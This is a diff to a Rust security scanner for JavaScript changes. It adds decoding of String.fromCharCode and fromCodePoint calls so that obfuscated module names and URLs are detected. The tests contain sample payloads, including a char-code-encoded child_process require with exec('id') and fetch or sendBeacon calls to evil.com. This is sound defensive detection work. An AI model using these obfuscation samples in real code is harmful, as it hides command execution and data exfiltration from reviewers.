@@ -528,9 +528,7 @@ fn scan_diff_for_suspicious_patterns(path: &str, diff: &str, findings: &mut Vec<
     }
 
     let combined_added = added_lines.join("\n");
-    let unescaped = unescape_js(&combined_added);
-    let s_clean = strip_comments_and_whitespace(&unescaped);
-    let s_folded = fold_adjacent_string_literals(&s_clean);
+    let s_folded = normalize_js(&combined_added);
     let s_clean_lower = s_folded.to_ascii_lowercase();
 
     if has_eval_invocation(&s_folded) {
@@ -903,6 +901,107 @@ fn fold_adjacent_string_literals(s: &str) -> String {
     out
 }
 
+fn normalize_js(s: &str) -> String {
+    let unescaped = unescape_js(s);
+    let cleaned = strip_comments_and_whitespace(&unescaped);
+    let folded_codes = fold_char_code_calls(&cleaned);
+    fold_adjacent_string_literals(&folded_codes)
+}
+
+/// Rewrites `String.fromCharCode(99,104,...)` and `String.fromCodePoint(...)`
+/// into a quoted string literal so downstream detectors see the reconstructed
+/// text. Calls whose arguments cannot be parsed as plain integer literals are
+/// left untouched.
+fn fold_char_code_calls(s: &str) -> String {
+    const MARKERS: [&str; 2] = ["fromCharCode(", "fromCodePoint("];
+    let mut out = String::with_capacity(s.len());
+    let mut rest = s;
+    while let Some((pos, marker)) = MARKERS
+        .iter()
+        .filter_map(|m| rest.find(m).map(|p| (p, *m)))
+        .min_by_key(|(p, _)| *p)
+    {
+        let args_start = pos + marker.len();
+        match parse_code_point_args(&rest[args_start..]) {
+            Some((codes, consumed)) => match quoted_literal(&codes) {
+                Some(literal) => {
+                    let call_start = if rest[..pos].ends_with("String.") {
+                        pos - "String.".len()
+                    } else {
+                        pos
+                    };
+                    out.push_str(&rest[..call_start]);
+                    out.push_str(&literal);
+                    rest = &rest[args_start + consumed..];
+                }
+                None => {
+                    out.push_str(&rest[..args_start]);
+                    rest = &rest[args_start..];
+                }
+            },
+            None => {
+                out.push_str(&rest[..args_start]);
+                rest = &rest[args_start..];
+            }
+        }
+    }
+    out.push_str(rest);
+    out
+}
+
+fn parse_code_point_args(s: &str) -> Option<(Vec<u32>, usize)> {
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    let mut codes = Vec::new();
+    loop {
+        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
+            i += 1;
+        }
+        if i >= bytes.len() {
+            return None;
+        }
+        let val = if bytes[i] == b'0' && i + 1 < bytes.len() && (bytes[i + 1] | 0x20) == b'x' {
+            i += 2;
+            let start = i;
+            while i < bytes.len() && bytes[i].is_ascii_hexdigit() {
+                i += 1;
+            }
+            if i == start {
+                return None;
+            }
+            u32::from_str_radix(&s[start..i], 16).ok()?
+        } else {
+            let start = i;
+            while i < bytes.len() && bytes[i].is_ascii_digit() {
+                i += 1;
+            }
+            if i == start {
+                return None;
+            }
+            s[start..i].parse::<u32>().ok()?
+        };
+        codes.push(val);
+        while i < bytes.len() && bytes[i].is_ascii_whitespace() {
+            i += 1;
+        }
+        match bytes.get(i) {
+            Some(b',') => i += 1,
+            Some(b')') => return Some((codes, i + 1)),
+            _ => return None,
+        }
+    }
+}
+
+fn quoted_literal(codes: &[u32]) -> Option<String> {
+    let text: String = codes.iter().filter_map(|&c| char::from_u32(c)).collect();
+    for q in ['\'', '"', '`'] {
+        if !text.contains(q) && !text.contains('\\') {
+            return Some(format!("{q}{text}{q}"));
+        }
+    }
+    None
+}
+
 fn contains_module_import(s: &str, module: &str) -> bool {
     const PREFIXES: [&str; 3] = ["require(", "import(", "from"];
     const QUOTES: [char; 3] = ['\'', '"', '`'];
@@ -942,10 +1041,7 @@ fn has_vm_invocation(s_clean: &str) -> bool {
 
 #[cfg(test)]
 fn is_vm_invocation(s: &str) -> bool {
-    let unescaped = unescape_js(s);
-    let s_clean = strip_comments_and_whitespace(&unescaped);
-    let s_folded = fold_adjacent_string_literals(&s_clean);
-    has_vm_invocation(&s_folded)
+    has_vm_invocation(&normalize_js(s))
 }
 
 fn contains_call(s: &str, target: &str) -> bool {
@@ -1025,10 +1121,7 @@ fn has_network_invocation(s_clean: &str) -> bool {
 
 #[cfg(test)]
 fn is_network_invocation(s: &str) -> bool {
-    let unescaped = unescape_js(s);
-    let s_clean = strip_comments_and_whitespace(&unescaped);
-    let s_folded = fold_adjacent_string_literals(&s_clean);
-    has_network_invocation(&s_folded)
+    has_network_invocation(&normalize_js(s))
 }
 
 fn has_dynamic_global_invocation(s_clean: &str) -> bool {
@@ -1271,10 +1364,7 @@ fn has_eval_invocation(s_clean: &str) -> bool {
 
 #[cfg(test)]
 fn is_eval_invocation(s: &str) -> bool {
-    let unescaped = unescape_js(s);
-    let s_clean = strip_comments_and_whitespace(&unescaped);
-    let s_folded = fold_adjacent_string_literals(&s_clean);
-    has_eval_invocation(&s_folded)
+    has_eval_invocation(&normalize_js(s))
 }
 
 fn has_child_proc_invocation(s_clean: &str) -> bool {
@@ -1377,10 +1467,7 @@ fn has_child_proc_invocation(s_clean: &str) -> bool {
 
 #[cfg(test)]
 fn is_child_proc_invocation(s: &str) -> bool {
-    let unescaped = unescape_js(s);
-    let s_clean = strip_comments_and_whitespace(&unescaped);
-    let s_folded = fold_adjacent_string_literals(&s_clean);
-    has_child_proc_invocation(&s_folded)
+    has_child_proc_invocation(&normalize_js(s))
 }
 
 fn has_base64_decode(s_clean_lower: &str) -> bool {
@@ -1400,9 +1487,7 @@ fn has_base64_decode(s_clean_lower: &str) -> bool {
 
 #[cfg(test)]
 fn is_base64_decode(s: &str) -> bool {
-    let unescaped = unescape_js(s);
-    let s_clean = strip_comments_and_whitespace(&unescaped);
-    let s_folded = fold_adjacent_string_literals(&s_clean);
+    let s_folded = normalize_js(s);
     let s_clean_lower = s_folded.to_ascii_lowercase();
     has_base64_decode(&s_clean_lower)
 }
@@ -2460,6 +2545,42 @@ mod tests {
         ));
         assert!(is_network_invocation(
             "navigator.sendBeacon('http://evil.com', data)"
+        ));
+    }
+
+    #[test]
+    fn detects_charcode_reconstructed_module_names() {
+        assert!(is_child_proc_invocation(
+            "var c = String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115); require(c).exec('id');"
+        ));
+        assert!(is_child_proc_invocation(
+            "var c = String.fromCodePoint(99,104,105,108,100,95,112,114,111,99,101,115,115); require(c).exec('id');"
+        ));
+        assert!(is_child_proc_invocation(
+            "var c = String.fromCharCode(0x63,0x68,0x69,0x6c,0x64,0x5f,0x70,0x72,0x6f,0x63,0x65,0x73,0x73); require(c).exec('id');"
+        ));
+        assert!(is_child_proc_invocation(
+            "require('child_' + String.fromCharCode(112,114,111,99,101,115,115))"
+        ));
+        assert!(is_vm_invocation(
+            "require(String.fromCharCode(118,109)).runInNewContext('1+1');"
+        ));
+        assert!(is_network_invocation(
+            "var h = ['ht', 'tp']; fetch(String.fromCharCode(104,116,116,112) + '://evil.com');"
+        ));
+    }
+
+    #[test]
+    fn charcode_folding_leaves_unparseable_calls_untouched() {
+        assert!(!is_child_proc_invocation(
+            "String.fromCharCode(99+x).repeat(2);"
+        ));
+        assert!(!is_child_proc_invocation(
+            "String.fromCharCode(72,101,108,108,111);"
+        ));
+        assert!(!is_eval_invocation("String.fromCharCode();"));
+        assert!(!is_child_proc_invocation(
+            "String.fromCharCode(99999999999999999999);"
         ));
     }
 }
